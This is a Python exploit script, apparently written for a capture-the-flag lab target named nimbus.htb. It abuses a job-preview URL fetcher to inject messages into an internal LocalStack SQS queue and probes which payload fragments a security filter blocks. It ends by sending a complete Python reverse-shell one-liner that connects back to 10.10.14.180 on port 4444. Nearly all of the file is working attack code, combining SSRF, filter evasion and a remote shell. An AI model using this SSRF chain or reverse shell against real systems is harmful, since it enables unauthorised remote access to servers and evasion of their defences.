import urllib.parse
import requests

LOCALSTACK = "172.18.0.2:4566"
ACCOUNT = "<REDACTED_ACCOUNT_ID>"
QUEUE = "nimbus-jobs"

def test(label, body):
    enc = urllib.parse.quote(body, safe="")
    url = f"http://{LOCALSTACK}/{ACCOUNT}/{QUEUE}?Action=SendMessage&Version=2012-11-05&MessageBody={enc}&x=.yaml"
    r = requests.post("http://nimbus.htb/jobs/preview", data={"url": url}, timeout=15)
    verdict = "BLOCKED" if "Security policy" in r.text else ("FETCHED" if "Fetched:" in r.text else "OTHER")
    print(f"{label:40s} len={len(url):5d} -> {verdict}")

test("short", "name: pwn\nscript: 'x'\n")
test("with 10.10.14.180 literal", "name: pwn\nscript: '10.10.14.180'\n")
test("with socket import", "name: pwn\nscript: 'import socket'\n")
test("with AF_INET", "name: pwn\nscript: 'socket.AF_INET'\n")
test("with dup2/fileno", "name: pwn\nscript: 'os.dup2(s.fileno(),0)'\n")
test("with /bin/sh -i", "name: pwn\nscript: 'subprocess.call([\"/bin/sh\",\"-i\"])'\n")
oneliner_full = (
    'import socket,subprocess,os;'
    's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
    's.connect(("10.10.14.180",4444));'
    'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);'
    'subprocess.call(["/bin/sh","-i"])'
)
test("full payload", f"name: pwn\nscript: '{oneliner_full}'\n")
